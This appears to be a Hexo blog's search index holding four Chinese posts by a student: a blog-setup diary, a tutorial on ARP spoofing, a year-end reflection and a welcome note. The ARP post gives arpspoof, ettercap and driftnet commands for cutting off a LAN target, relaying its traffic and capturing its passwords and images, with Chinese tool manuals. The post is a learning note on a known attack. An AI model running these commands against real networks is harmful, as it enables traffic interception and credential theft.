powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell">npm install <span class="hljs-literal">-g</span> hexo<span class="hljs-literal">-cli</span><br></code></pre></td></tr></table></figure><p>换源以后下载速度贼快</p><h4 id="踩坑"><a href="#踩坑" class="headerlink" title="踩坑"></a>踩坑</h4><p>（接下来是不重要的碎碎念可以直接跳过看下一趴）</p><p>最开始看的教程说要修改环境变量，修改了大半天。执行npm install的时候一直报错，一气之下把node所有文件都删了，重新下载。</p><p><del>(别学我，遇到报错要找问题原因而不是逃避)</del></p><blockquote><p>大半夜下载不动寻求卷师傅帮忙，卷发现我的代理地址没更新，狠狠拖后腿。🥲</p></blockquote><p>重新下载之后保持自动配置的环境变量不变，在命令行里直接npm install发现还是报以前一样的错。</p><p><img src="/img/%E4%B8%80%E8%B5%B7%E6%9D%A5%E6%90%AD%E5%8D%9A%E5%AE%A2/Snipaste_2022-12-08_11-01-33.png"></p><p>复制百度发现是权限不够，要用管理员方式执行命令。</p><blockquote><p>所以我白删了呗！！</p></blockquote><p>win+R打开管理员方式终端，再次输入显示timeout。</p><p><img src="/img/%E4%B8%80%E8%B5%B7%E6%9D%A5%E6%90%AD%E5%8D%9A%E5%AE%A2/Snipaste_2022-12-08_10-59-37.png"></p><p>又百度发现需要换源。</p><p>直接从网上找了个现成的淘宝源，换好以后再install五秒成功。</p><p><img src="/img/%E4%B8%80%E8%B5%B7%E6%9D%A5%E6%90%AD%E5%8D%9A%E5%AE%A2/Snipaste_2022-12-08_11-02-39.png"></p><h2 id="Hexo的网页配置"><a href="#Hexo的网页配置" class="headerlink" title="Hexo的网页配置"></a>Hexo的网页配置</h2><p>下载后输入</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell">hexo init blog<br></code></pre></td></tr></table></figure><p>这个命令就是在powershell当前的根目录下新建一个名为blog的文件夹，用于后续配置文件的存放。</p><p>[<em>blog</em>]好像可以填别的文件名，但我没试过所以不建议。</p><p><img src="/img/%E4%B8%80%E8%B5%B7%E6%9D%A5%E6%90%AD%E5%8D%9A%E5%AE%A2/Snipaste_2022-12-08_20-25-14.png"></p><p>建好文件夹之后初始化配置</p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm">cd <span class="hljs-keyword">blog </span>  <span class="hljs-comment">#进入blog文件夹</span><br>npm <span class="hljs-keyword">install </span>   <br></code></pre></td></tr></table></figure><p>这个命令结束以后就可以看到blog文件夹里有很多文件喽，类似于下图这样。</p><p>图片里有些文件你没有也没关系，因为这是我建成博客又下载了很多东西之后补截的图。😳</p><p><img src="/img/%E4%B8%80%E8%B5%B7%E6%9D%A5%E6%90%AD%E5%8D%9A%E5%AE%A2/Snipaste_2023-03-13_21-01-30.png"></p><p>两条命令生成网页</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">hexo generate<br>hexo server<br></code></pre></td></tr></table></figure><p>当然喽hexo善解人意地支持简写，可以直接输入 <code>hexo g</code>和<code>hexo s</code></p><p>用浏览器预览网址<a href="http://localhost:4000/">http://localhost:4000</a></p><p>因为我们还没配置GitHub所以这个时候就是Hexo最基础的丑陋页面。</p><h4 id="踩坑-1"><a href="#踩坑-1" class="headerlink" title="踩坑"></a>踩坑</h4><p>cmd里输入hexo命令后又报错</p><p>说hexo不是可以执行的命令，百度后发现是环境变量的问题，<del>该死的环境变量</del></p><p>发现hexo-cli的bin目录下没有.cmd的文件，但是前一个目录里有，就直接复制过来，又把bin添加到了环境变量里，再hexo init</p><p>运行成功但报错，<del>想死</del></p><p><img src="/img/%E4%B8%80%E8%B5%B7%E6%9D%A5%E6%90%AD%E5%8D%9A%E5%AE%A2/Snipaste_2022-12-08_12-29-06.png"></p><p>据说是因为目录下没有这个文件夹，<del>为什么应该有hexo的文件夹啊</del></p><p>换个思路，用管理员模式重新下载hexo（我就个遇到困难卸载删除的菜鸡😶‍🌫️</p><p>下载后运行<code>hexo init blog</code></p><p><img src="/img/%E4%B8%80%E8%B5%B7%E6%9D%A5%E6%90%AD%E5%8D%9A%E5%AE%A2/Snipaste_2022-12-08_20-24-15.png"></p><p>又一次向万能的互联网求助，修改了一下power shell的权限，再运行</p><p><img src="/img/%E4%B8%80%E8%B5%B7%E6%9D%A5%E6%90%AD%E5%8D%9A%E5%AE%A2/Snipaste_2022-12-08_20-25-14.png"></p><p>成功（？？）</p><blockquote><p>管理员模式yyds</p></blockquote><h2 id="GitHub配置网页"><a href="#GitHub配置网页" class="headerlink" title="GitHub配置网页"></a>GitHub配置网页</h2><p>在GitHub里建一个<strong>用户名.github.io</strong>的仓库，建好以后点击page把这个库变成一个网页。</p><p>我们在命令行输入<code>hexo d</code> 时默认上传<strong>master</strong>分支，但是在GitHub页面默认<strong>main</strong>分支，需要改成master。没有下拉选项，要手动输入</p><p><img src="/img/%E4%B8%80%E8%B5%B7%E6%9D%A5%E6%90%AD%E5%8D%9A%E5%AE%A2/Snipaste_2023-03-13_21-16-37.png"></p><p>但是这个时候先别hexo d，会报错，因为还没连接GitHub和hexo。</p><p>这时候你在浏览器搜索<code>https://用户名.github.io</code>，出现仓库的自述文件就是成功啦。</p><h2 id="SSH连接GitHub"><a href="#SSH连接GitHub" class="headerlink" title="SSH连接GitHub"></a>SSH连接GitHub</h2><p>也是默认大家有这玩意的哈</p><p>在git里面输入</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell">ssh<span class="hljs-literal">-keygen</span> <span class="hljs-literal">-t</span> rsa <span class="hljs-literal">-C</span> <span class="hljs-string">&quot;[your_email@example.com]&quot;</span><br></code></pre></td></tr></table></figure><p>按回车之后会提示输入内容，可以全部按回车，表示使用默认的<code>~/.ssh</code>文件目录存放密钥，以及不设置密钥的密码。</p><p>在文件夹里找到.ssh文件，找到里面的密钥复制到GitHub。在个人设置页面的SSH and GPG keys 添加</p><p><img src="/img/%E4%B8%80%E8%B5%B7%E6%9D%A5%E6%90%AD%E5%8D%9A%E5%AE%A2/Snipaste_2023-02-20_23-36-59.png"></p><p>再打开git输入连接命令</p><p><img src="/img/%E4%B8%80%E8%B5%B7%E6%9D%A5%E6%90%AD%E5%8D%9A%E5%AE%A2/Snipaste_2022-12-08_11-42-49.png"></p><h2 id="Hexo内部操作"><a href="#Hexo内部操作" class="headerlink" title="Hexo内部操作"></a>Hexo内部操作</h2><h3 id="写作"><a href="#写作" class="headerlink" title="写作"></a>写作</h3><p><strong>在blog文件夹里操作</strong></p><p>创建新文章</p><figure class="highlight actionscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs actionscript">hexo <span class="hljs-keyword">new</span> <span class="hljs-string">&quot;文章标题&quot;</span><br></code></pre></td></tr></table></figure><p><img src="/img/%E4%B8%80%E8%B5%B7%E6%9D%A5%E6%90%AD%E5%8D%9A%E5%AE%A2/Snipaste_2022-12-08_21-05-20.png"></p><p>还会贴心的告诉你建在哪里了</p><blockquote><p>它真的，我哭死</p></blockquote><p>之后就可以在这个文件夹里看到以“文章标题”命名的md文件，在里面修改之后再运行<code>hexo g</code>和<code>hexo s</code>就能在预览网页看到刚发的文档啦。</p><blockquote><p>这一趴无脑跟教程走没踩雷，我又活了🥳</p></blockquote><h5 id="配置环节"><a href="#配置环节" class="headerlink" title="配置环节"></a>配置环节</h5><p>配置文件[-config.yml]</p><p><code>title</code>修改网页导航栏标签</p><p><img src="/img/%E4%B8%80%E8%B5%B7%E6%9D%A5%E6%90%AD%E5%8D%9A%E5%AE%A2/Snipaste_2022-12-08_21-17-41.png"></p><p>让网页和GitHub联姻</p><p><img src="/img/%E4%B8%80%E8%B5%B7%E6%9D%A5%E6%90%AD%E5%8D%9A%E5%AE%A2/Snipaste_2022-12-09_21-03-45.png"></p><p><code>theme</code>改主题，直接复制主题名字就好</p><h4 id="踩坑-2"><a href="#踩坑-2" class="headerlink" title="踩坑"></a>踩坑</h4><p><code>hexo d</code>把写作部署到GitHub上，又报错啦哈哈哈</p><p><img src="/img/%E4%B8%80%E8%B5%B7%E6%9D%A5%E6%90%AD%E5%8D%9A%E5%AE%A2/Snipaste_2022-12-08_21-30-22.png"></p><p>万能的互联网说这个叫映射条目缩进错误，改了好几遍缩进都不对</p><p>还碰到了一个错误</p><blockquote><p>(101.1)错误的意思是第101行与前文重复，把这一行注释掉就行</p></blockquote><p>最后改成这样运行成功</p><p><img src="/img/%E4%B8%80%E8%B5%B7%E6%9D%A5%E6%90%AD%E5%8D%9A%E5%AE%A2/Snipaste_2022-12-08_21-49-15.png"></p><p>但是查看<a href="https://shmodifier.github.io还是不成功/">https://ShModifier.github.io还是不成功</a></p><p>后来发现我这聪明的小脑瓜把信息放错了位置🍃</p><p><img src="/img/%E4%B8%80%E8%B5%B7%E6%9D%A5%E6%90%AD%E5%8D%9A%E5%AE%A2/Snipaste_2022-12-09_21-03-45.png"></p><p>改成这样就好啦</p><hr><p>把搭博客的笔记发上来，给大家看看笑话☃️</p>]]></content>
    
    
    <categories>
      
      <category>踩坑</category>
      
    </categories>
    
    
    <tags>
      
      <tag>hexo</tag>
      
      <tag>GitHub</tag>
      
      <tag>Node</tag>
      
      <tag>Git</tag>
      
      <tag>ssh</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>关于ARP欺骗和ARP攻击</title>
    <link href="/2023/01/05/%E5%85%B3%E4%BA%8EARP%E6%AC%BA%E9%AA%97%E5%92%8CARP%E6%94%BB%E5%87%BB/"/>
    <url>/2023/01/05/%E5%85%B3%E4%BA%8EARP%E6%AC%BA%E9%AA%97%E5%92%8CARP%E6%94%BB%E5%87%BB/</url>
    
    <content type="html"><![CDATA[<p>趁着寒假偷偷卷哈哈哈🤪</p><span id="more"></span><h3 id="ARP协议"><a href="#ARP协议" class="headerlink" title="ARP协议"></a>ARP协议</h3><p>地址解析协议，即ARP（Address Resolution Protocol），是根据IP地址获取物理地址的一个TCP&#x2F;IP协议。</p><blockquote><p>每一台主机都有一个arp高速缓存，里面有本局域网中的各主机和路由器的IP地址到硬件地址的映射表</p></blockquote><h4 id="工作流程"><a href="#工作流程" class="headerlink" title="工作流程"></a>工作流程</h4><p>主机A和主机B各自有自己的IP地址和MAC地址，在主机A与主机B通信时，ARP协议可将主机B的IP地址解析为MAC地址。</p><p>第一步：</p><p>主机A首先确定用于访问主机B的IP地址，然后主机A在自己的本地ARP缓存中检查主机B的IP地址匹配的MAC地址</p><p>第二步：</p><p>如果主机A在ARP缓存中没有找到主机B的IP映射，它将询问主机B对应的硬件地址，会将ARP请求帧广播到本地网络上的所有主机，主机A的IP地址和MAC地址都包括在ARP请求中。本地网络上的每台主机都接受到ARP请求并检查是否与自己的IP地址匹配。如果主机发现请求的IP地址以自己的IP地址不匹配，他将丢弃ARP请求。</p><p><img src="/img/%E5%85%B3%E4%BA%8EARP%E6%AC%BA%E9%AA%97%E5%92%8CARP%E6%94%BB%E5%87%BB/ARP1.png"></p><p>第三步：</p><p>主机B确定AARP请求中的IP地址于自己的IP地址匹配，并将主机A的IP地址和MAC地址映射添加到本地ARP缓存中。</p><p>第四步：</p><p>主机B将包含MAC地址的ARP回复消息直接发送到主机A</p><p><img src="/img/%E5%85%B3%E4%BA%8EARP%E6%AC%BA%E9%AA%97%E5%92%8CARP%E6%94%BB%E5%87%BB/ARP2.png"></p><p>第五步：</p><p>当主机A收到从主机B发来的ARP回复消息时，会使用主机B的IP地址和MAC地址映射更新ARP缓存。本机缓存是有生存期的，生存期结束，将再次重复上面的内容。主机B的MAC地址一旦确定，主机A就能向主机B发送IP通信了。</p><h4 id="命令窗口玩转ARP"><a href="#命令窗口玩转ARP" class="headerlink" title="命令窗口玩转ARP"></a>命令窗口玩转ARP</h4><p>输入<code>arp</code>提示使用方法</p><p><img src="/img/%E5%85%B3%E4%BA%8EARP%E6%AC%BA%E9%AA%97%E5%92%8CARP%E6%94%BB%E5%87%BB/Snipaste_2023-01-04_18-08-45.png"></p><blockquote><p>这里一开始总是说“’ARP’不是可执行的程序”，凭我踩坑经验知道这是环境变量的问题。费尽千辛万苦发现是因为我的环境变量里居然没有system32🥲。但是输入path查看是有它的，不知道哪里出了问题，加上之后重启就好啦</p></blockquote><p>输入<code>arp -a</code>查看ARP缓存表信息</p><p><img src="/img/%E5%85%B3%E4%BA%8EARP%E6%AC%BA%E9%AA%97%E5%92%8CARP%E6%94%BB%E5%87%BB/Snipaste_2023-01-04_18-09-19.jpg"></p><p><strong>静态</strong>地址即主机自己配置生成的地址。</p><p>当主机新连接入一台设备，并且与主机产生通信后，aqp表会更新一条<strong>动态</strong>地址。</p><h3 id="ARP攻击"><a href="#ARP攻击" class="headerlink" title="ARP攻击"></a>ARP攻击</h3><p>ARP攻击就是通过伪造IP地址和MAC地址的对应关系，使得网络无法正常通信。即修改靶机的IP地址和MAC地址，使其他设备与靶机的通信无法正常进行，进而截断靶机流量。</p><blockquote><p>可以直接使用arpspoof插件攻击</p></blockquote><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css">sudo arpspoof -<span class="hljs-selector-tag">i</span> eth0  -t <span class="hljs-selector-attr">[目标IP]</span> -r <span class="hljs-selector-attr">[网关]</span><br></code></pre></td></tr></table></figure><p>这里”r”的用法没搞懂😣好像就是直接双向攻击</p><p>Ctrl+C或关闭终端即停止攻击</p><h3 id="ARP欺骗"><a href="#ARP欺骗" class="headerlink" title="ARP欺骗"></a>ARP欺骗</h3><p><del>听说ARP欺骗配合DNS欺骗效果更佳</del>🤨</p><h5 id="可以用来干的坏事"><a href="#可以用来干的坏事" class="headerlink" title="可以用来干的坏事"></a>可以用来干的坏事</h5><ul><li>获取浏览图片</li><li>获取靶机各平台输入的账号密码</li><li>获取浏览地址</li></ul><h5 id="行骗方法"><a href="#行骗方法" class="headerlink" title="行骗方法"></a>行骗方法</h5><h6 id="1-伪装成网关"><a href="#1-伪装成网关" class="headerlink" title="1.伪装成网关"></a>1.伪装成网关</h6><p>欺骗源把自己伪装成网关，向局域网内的目标主机发送ARP报文，使得局域网内的主机误以为欺骗源的MAC地址是网关MAC地址，并将原本应该流向网关的数据都发送到欺骗源。</p><blockquote><p>直接对靶机实施ARP欺骗</p></blockquote><h6 id="2-伪装成主机"><a href="#2-伪装成主机" class="headerlink" title="2.伪装成主机"></a>2.伪装成主机</h6><p>用来欺骗局域网内的其他所有主机</p><p>欺骗源将自己伪装成局域网内的另一台主机3，将主机3的IP地址对应的MAC地址替换为欺骗元的IP地址对应的MAC地址使得局域网内靶机发往主机3的报文都流向欺骗源</p><blockquote><p>分别对网关和靶机实施ARP欺骗</p></blockquote><h3 id="操作步骤（行骗步骤）"><a href="#操作步骤（行骗步骤）" class="headerlink" title="操作步骤（行骗步骤）"></a>操作步骤<del>（行骗步骤）</del></h3><blockquote><p>伪装成网关</p></blockquote><p>首先查看欺骗源和靶机的IP地址</p><ul><li><p>直接查看：kali命令窗口输入<code>ifconfig</code>，Windows命令窗口输入<code>ipconfig</code></p></li><li><p>正经方法：</p><p>1.在kali命令窗口输入<code>fping -g xxx.xxx.xxx[网络号码].1/24</code>查询目标网络下的所有主机IP </p><p>2.输入命令<code>nmap -sP xxx.xxx.xxx[网络号码].0/24</code>查询目标网络下的所有主机IP</p></li></ul><p>输入命令<code>route-n</code>查看网关</p><p>使用arpspoof行骗</p><blockquote><p>kali命令窗口输入sudo arpspoof -h查看已经安装的arpspoof版本号，如果未安装，系统会弹出提示，按照提示安装即可 </p></blockquote><p>断网操作</p><p>把靶机发出的请求接受到攻击源主机，因为linux默认ip_forward为0，即不进行流量转发，所以靶机会断网</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs css">让靶机认为攻击源为网关：<br>sudo arpspoof -<span class="hljs-selector-tag">i</span> <span class="hljs-selector-attr">[网卡]</span> -t <span class="hljs-selector-attr">[目标IP]</span> <span class="hljs-selector-attr">[网关]</span><br></code></pre></td></tr></table></figure><p>或者反向欺骗</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs css">让网关认为攻击源是靶机：<br>sudo arpspoof -<span class="hljs-selector-tag">i</span> <span class="hljs-selector-attr">[网卡]</span> -t <span class="hljs-selector-attr">[网关]</span> <span class="hljs-selector-attr">[目标IP]</span><br></code></pre></td></tr></table></figure><blockquote><p>网卡默认eth0</p></blockquote><p><img src="/img/%E5%85%B3%E4%BA%8EARP%E6%AC%BA%E9%AA%97%E5%92%8CARP%E6%94%BB%E5%87%BB/Snipaste_2023-01-05_23-10-21.jpg"></p><p><code>cat /proc/sys/net/ipv4/ip_forward </code>查看ip_forward的值。如果ip_forward为0，则被攻击主机不能上网；如果ip_forward为1，则被攻击主机可以上网</p><p>修改数值让他上网</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">echo <span class="hljs-number">1</span> &gt; <span class="hljs-regexp">/proc/</span>sys<span class="hljs-regexp">/net/i</span>pv4/ip_forward<br></code></pre></td></tr></table></figure><blockquote><p>权限不够就<code>sudo -i</code> 使用root权限改</p></blockquote><p>限制网速</p><p>可以使用的工具有tc、iptables、WonderShaper等等，</p><p>以tc为例<del>本菜鸡还没学会后两个</del>😢：</p><figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs maxima">限制网速200ms延时<br>sudo tc qdisc add dev eth0 root netem <span class="hljs-built_in">delay</span> 200ms<br> <br>取消限制网速200ms延时<br>sudo tc qdisc <span class="hljs-built_in">del</span> dev eth0 root netem <span class="hljs-built_in">delay</span> 200ms<br></code></pre></td></tr></table></figure><p>拦截数据—获取浏览网页及账号密码</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css">ettercap -Tq -<span class="hljs-selector-tag">i</span> <span class="hljs-selector-attr">[网卡]</span><br></code></pre></td></tr></table></figure><p>嗅探图片</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css">driftnet  -<span class="hljs-selector-tag">i</span> <span class="hljs-selector-attr">[网卡]</span><br></code></pre></td></tr></table></figure><hr><h3 id="工具说明书"><a href="#工具说明书" class="headerlink" title="工具说明书"></a>工具说明书</h3><p>因为各种工具的使用说明都是英文的，所以直接利用万能的互联网搜了一下中文的使用指南：</p><h5 id="driftnet"><a href="#driftnet" class="headerlink" title="driftnet"></a>driftnet</h5> <figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs css">语法： driftnet   <span class="hljs-selector-attr">[options]</span>   <span class="hljs-selector-attr">[filter code]</span><br><br> -<span class="hljs-selector-tag">b</span>  捕获到新的图片时发出嘟嘟声<br> -<span class="hljs-selector-tag">i</span>  interface     选择监听接口<br> -f  file   读取一个指定pcap数据包中的图片<br> -<span class="hljs-selector-tag">p</span>  不让所监听的接口使用混杂模式<br> -<span class="hljs-selector-tag">a</span>  后台模式：将捕获的图片保存到目录中（不会显示在屏幕上）<br> -m  number 指定保存图片数的数目<br> -d  directory  指定保存图片的路径<br> -x  prefix  指定保存图片的前缀名<br></code></pre></td></tr></table></figure><h5 id="arpspoof"><a href="#arpspoof" class="headerlink" title="arpspoof"></a>arpspoof</h5><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs markdown">名字 <br><span class="hljs-code">       arpspoof - 截获交换局域网中的数据包</span><br><span class="hljs-code"></span><br>用法<br><span class="hljs-code">       arpspoof [-i interface] [-c own|host|both] [-t target] [-r] host</span><br><span class="hljs-code"></span><br>描述<br><span class="hljs-code">       arpspoof通过伪造的ARP响应包改变局域网中从目标主机（或所有主机）到另一个主机（host）的数据包转发路径。这是交换局域网中嗅探网络流量的一种极为有效的方法。</span><br><span class="hljs-code">       内核IP转发（或如fragrouter这样的、用户层面的、能完成同样功能的软件）必须提前开启。</span><br><span class="hljs-code"></span><br>参数<br><span class="hljs-code">       -i interface</span><br><span class="hljs-code">              指定要使用的接口（即指定一块网卡）</span><br><span class="hljs-code"></span><br><span class="hljs-code">       -c own|host|both</span><br><span class="hljs-code">              指定在恢复ARP配置时使用的硬件地址；当在清理（cleaning up）时，数据包的源地址可以用自己的也可以用主机（host）的硬件地址。</span><br><span class="hljs-code">              使用伪造的硬件地址可能导致某些配置下的交换网络、AP网络或桥接网络通信中断，然而它比起默认值————使用自己的硬件地址要工作地更为可靠。</span><br><span class="hljs-code"></span><br><span class="hljs-code">       -t target</span><br><span class="hljs-code">              指定一个特殊的、将被ARP毒化的主机（如果没有指定，则认为是局域网中所有主机）。重复可以指定多个主机。</span><br><span class="hljs-code"></span><br><span class="hljs-code">       -r     毒化两个主机（目标和主机（host））以捕获两个方向的网络流量。（仅仅在和-t参数一起使用时有效）</span><br><span class="hljs-code"></span><br><span class="hljs-code">       host   host是你想要截获数据包的主机 (通常是网关)。</span><br><span class="hljs-code"></span><br></code></pre></td></tr></table></figure><h5 id="ettercap"><a href="#ettercap" class="headerlink" title="ettercap"></a>ettercap</h5><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-tag">i</span>后面跟着连接局域网的网卡<br>T指的是text文本模式<br><span class="hljs-selector-tag">q</span>以安静模式执行这个命令<br>M指定攻击模式<br>&gt;&gt;输出文件<br></code></pre></td></tr></table></figure><hr><p>发个笔记上来不然这个博客真的成碎碎念专栏了😶‍🌫️</p><p>我就是个菜鸡🍃</p>]]></content>
    
    
    
    <tags>
      
      <tag>Knowledge</tag>
      
      <tag>ARP</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>年终总结</title>
    <link href="/2022/12/29/%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/"/>
    <url>/2022/12/29/%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/</url>
    
    <content type="html"><![CDATA[<p>想好怎样告别2022了吗？🥰</p><span id="more"></span><p>我总是喜欢在年末给未来一年的自己留下祝福，今年还是像往年一样的套路：希望2023的自己可以更洒脱、更自由。</p><p>过去的一年，我来到了梦寐以求的十八岁。我从被囚禁在应试教育中的高中生变成了悠闲又忙碌的大学生；我考出了驾照、学会了弹吉他；我第一次离开了父母、远离家乡，开始住宿生活；我了解到不同的世界，看到了新的风景。</p><p>过去的一年，我和很多人相遇，也和很多人告别。</p><p>这几天我想为自己挑选年度九图，于是乎我翻出了网盘里属于高中的文件夹。毕竟就在上半年，我还是一个被豢养的高考金丝雀。我打开看，里面盛满了我高三那年用老古董相机定格的青春热血。文件夹里有学校里盛开的花，阳光下惬意的猫，还有数不清的意气风发的少年。还记得，晦涩而又灿烂的高三，每天晚自习的最后半小时，我都没有向老师家长叮嘱的那般抓紧时间背单词、写大题，我把时间用来在本子上记录我的喜怒哀乐，书写我对这段时光的不舍与留恋。高中毕业，我攒了三本日记加一本随笔。</p><p>我仍记得毕业那场分别，我们背着书包，像平常那样说着再见。我和朋友们没有轰轰烈烈的告别，只有在耳边吹过的炎热又潮湿的晚风，和窗外的喧闹不止的蝉鸣。我将记录随笔的本子带到了大学，却未曾在上面写下一个文字。我只是一次又一次的翻开它，当作大学生活中的乐趣，去重温那段兵荒马乱而又潇洒肆意的时光。就像我在本子里写下的第一段话——“我所记录的每一个文字，都是过去的我对未来的赠礼”。</p><p>四个月的大学好像电影胶卷，被机器拉扯着，在我眼前一闪而过，但是这条路上仍然有精彩的风景。我遇到了新的朋友，和他们分享不同的幸福。全新的生活并不没有让我感到不安，或许是骨子里的积极勇敢，异或许是身边伙伴的鼓励陪伴，让我的这段新的旅程总是平稳畅通的。从学期初的擒敌拳，到学会的投篮捡漏技巧，还有为了交作业尝试的改源码的歪门邪道，再到期末临走前夜获得的羽毛球耍帅技巧······这些奇奇怪怪的技能背后，都有一群我非常感谢相遇相识的人。我还是个喜欢收集物料的人，宿舍书桌上的软木板，钉着我的第一张献血证书，贴着我第一次部门破冰会议的卡片，框架边缘里夹还有临走时收到的新年贺卡······这些物件承载的故事总能在回忆里熠熠生辉。</p><p>在夜深时分，我经常会把这些碎片从记忆深处拎出来，把他们拼凑成完整的拼图。</p><p><del>好吧，我承认自己总是活在回忆里。</del></p><p>最后，感谢2022，让我遇到了意趣相投的人，也让我拥有滚烫而又热烈的记忆。</p><p>新的一年，愿我所爱，平安顺遂。🎆</p>]]></content>
    
    
    <categories>
      
      <category>碎碎念</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>乐园入场券</title>
    <link href="/2022/12/10/%E4%B9%90%E5%9B%AD%E5%85%A5%E5%9C%BA%E5%88%B8/"/>
    <url>/2022/12/10/%E4%B9%90%E5%9B%AD%E5%85%A5%E5%9C%BA%E5%88%B8/</url>
    
    <content type="html"><![CDATA[<p>这是一张乐园入场券</p><span id="more"></span><p>恭喜你发现了宝藏！</p><p>成功搭建这个博客这是我上大学以来做过最有成就感的事。虽然过程中踩了很多坑，但感谢我没有放弃，才有了现在这个属于我的小小极乐世界。</p><p>这里是一个Modifier的备忘仓库，也有很多未知宝藏。</p><hr><p>最近在不停地修改我的文章，尽可能的把文章写得简洁明了。</p><p>一些很基础的东西也发上来，一是想记录自己的学习历程，二是想着，等到哪天我的文章也有人看了，能让人一下子就能看得明白。</p><hr><p>如果你看到了这里，那就祝你在Modifier的极乐世界里享受自由与快乐吧！</p>]]></content>
    
    
    <categories>
      
      <category>碎碎念</category>
      
    </categories>
    
    
  </entry>
  
  
  
  
</search>
